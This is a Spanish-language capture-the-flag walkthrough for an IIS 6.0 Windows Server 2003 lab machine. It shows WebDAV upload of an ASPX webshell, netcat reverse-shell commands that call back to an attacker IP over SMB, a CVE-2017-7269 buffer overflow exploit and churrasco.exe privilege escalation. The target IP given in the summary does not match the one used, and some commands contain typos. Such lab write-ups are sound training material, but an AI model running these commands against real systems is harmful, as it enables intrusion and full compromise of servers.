## Summary

Tags: #Windows #HTTP #IIS #WebDav #ReverShell #BufferOverflow #RCE #JuicyPotato #Churrasco #Server2003

- IP -> 10.10.11.130
- Ports -> TCP (80), UDP (idk)
- OS ->  Windows IIS
- Services & Applications
    - 80 -> 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p80 ❮Target IP❯ -oN targeted
```

```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

	#  -p80 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  -oN WebScan = Exporta el output a un fichero en formato nmap con nombre “WebScan”
```
Pero no encontramos nada.

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

# Encontramos 
	# Microsoft-ISS/6.0
```

En la captura de Nmap además de encontrar que el puerto 80 esta abierto, podemos ver que nos sale los métodos permitidos.
```bash 
# Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH... 
# Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND...

	# PUT = Subir un archivo al servidor 
	# MOVE = 'Mover' el archivo o cambiarle de extension

# Type WebDav
```

Como vemos que hay un WebDav podemos usar la siguiente herramienta para testear que tipo de archivos podemos subir al servidor. Lo que hace la herramienta es que subirá todo tipo de archivos y nos reportara cuales si logro subir. 
```bash 
❯ davtest -url http://10.10.10.15 
```

* Para un **IIS** una extensión critica es la de **asp o aspx** 

La herramienta nos reporta que no podemos subir la extensión .aspx. Por lo que subiremos un archivo malicioso con otro tipo de extensión que sea permitida, después con el archivo subido, cambiaremos su extensión con el método MOVE a la extensión de .aspx.

Buscaremos la Webshell de Windows para que nos la interprete IIS y así poder ejecutar comandos.
```bash 
❯ locate cmdasp.apsx    # Buscaremos el archivo en nuestra maquina de atacante 
```

```bash 
❯ curl -s -X PUT http://10.10.10.15/cmd.txt -d @cmdasp.aspx

	# d = Subir una data que es indicada con el @ y sera el archivo de la cdm
```

Le cambiamos la extensión al archivo que hemos subido
```bash 
❯ curl -s -X MOVE http://10.10.10.15/cmd.txt -H "Destination:http://10.10.10.15/cmd.aspx"
```

Ahora en la Web, al final de la url le colocamos el cmd.aspx y así podremos obtener la Webshell.

Como tenemos ejecución remota de comandos. Haremos una ReverShell a nuestra IP y al puerto 443. Pero primero buscamos el nc.exe para Windows en nuestra maquina de atacante. 
```bash 
❯ locate nc.exe
```

Compartimos el archivo a nivel de red para Windows, para después ejecutarlo desde el recurso compartido y el servidor de la maquina victima
```bash 
❯ impacket-smbserver smbFolder $(pwd) -smb2support           # Compartiremos el recurso de Netcat a nivel de red

	# smbFolder = Nombre de la carpeta que compartiremos a nivel de red 
	# pwd = Sincronizado con la ruta actual de trabajo
	# smb2support = Sporte a la version 2 de smb
```

Ahora en la consola de la web hacemos lo siguiente:
```bash 
\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443

	# e = Ejecutamos el Netcat con una cmd, que nos la enviaremos a nuestro equipo por el puerto 443
```

Antes de ejecutar el comando en la web, nos ponemos en escucha por el puerto 443 
```bash 
❯ rlwrap nc -nlvp 443
```

### Segunda forma de intrusión 

Otra forma de hacer la intrusión es por medio del Buffer Overflow
```bash
❯ searchsploit IIS 6.0                        # Para buscar un exploit
```

```bash 
❯ searchsploit -m 41738.py                    # Para descargarnos el exploit .py que nos ayudara a hacer el Buffer Overflow para el IIS 6.0

	# m = move


# O podemos clonarnos el siguiente directorio con un exploit mejor
❯ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```
Al momento de mirar el contenido del exploit, podemos observar que usa el método **PROPFIND** y este método si esta disponible en el servidor. 

Ejecutamos el exploit de la siguiente manera:
```python 
❯ python2 iis6.py <IP Victima> 80 <IP Atacante> 443

	# ip = IP de la maquina victima 
	# 80 = Puerto victima 
	# ip A = Ip de la maquina de atacante
	# 443 = Puerto a abrir de la maquina de atacante  
```

Antes de ejecutar el comando en la web, nos ponemos en escucha por el puerto 443 
```bash 
❯ rlwrap nc -nlvp 443
```

## User

* Ahora nos hemos convertido en NT authority\\network service 


* Ahora buscaremos la forma de ser NT Authority\\System

```bash
❯  whoami /priv                              # Miramos los privilegios que tenemos   
	
	# SetImpersonatePrivilege = En el cual podriamos usar RottenPotato o  JuicyPotato, este es para servers del 2003
```

Nos descargamos el de la siguiente pagina:
* [Juicy-Potato-Server-2003](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

Descargamos el archivo de churracco.exe y lo compartimos a la maquina victima por un servidor smb. 
```bash 
❯ impacket-smbserver smbFolder $(pwd) -smb2support           # Compartiremos el recurso de Netcat a nivel de red

	# smbFolder = Nombre de la carpeta que compartiremos a nivel de red 
	# pwd = Sincronizado con la ruta actual de trabajo
	# smb2support = Sporte a la version 2 de smb
```

En la consola de Windows para transferirnos el archivo, primero debemos de ir al dir **Temp** y después colocamos el siguiente comando. 
```python
❯ copy \10.10.14.11\\smbFolder\\churrasco.exe churrasco.exe    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

Ejecutamos el churrasco de la siguiente manera
```bash 
❯ churrasco.exe "\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443"           # Al momento de ejecutar el churrasco debemos de colocar el comandos a ejecutar 
```

Pero antes compartirnos el Netcat a nivel de red para Windows, para después ejecutarlo desde el recurso compartido y el servidor de la maquina victima
```bash 
❯ impacket-smbserver smbFolder $(pwd) -smb2support           # Compartiremos el recurso de Netcat a nivel de red

	# smbFolder = Nombre de la carpeta que compartiremos a nivel de red 
	# pwd = Sincronizado con la ruta actual de trabajo
	# smb2support = Sporte a la version 2 de smb
```

Nos ponemos en escucha 
```bash 
❯ rlwrap nc -nlvp 443
```

## Root

Ahora somos NT Authority\\System
Buscamos la primer flag del usuario user.txt en Lakis, en donde antes no nos podíamos meter y la segunda flag en Administrator
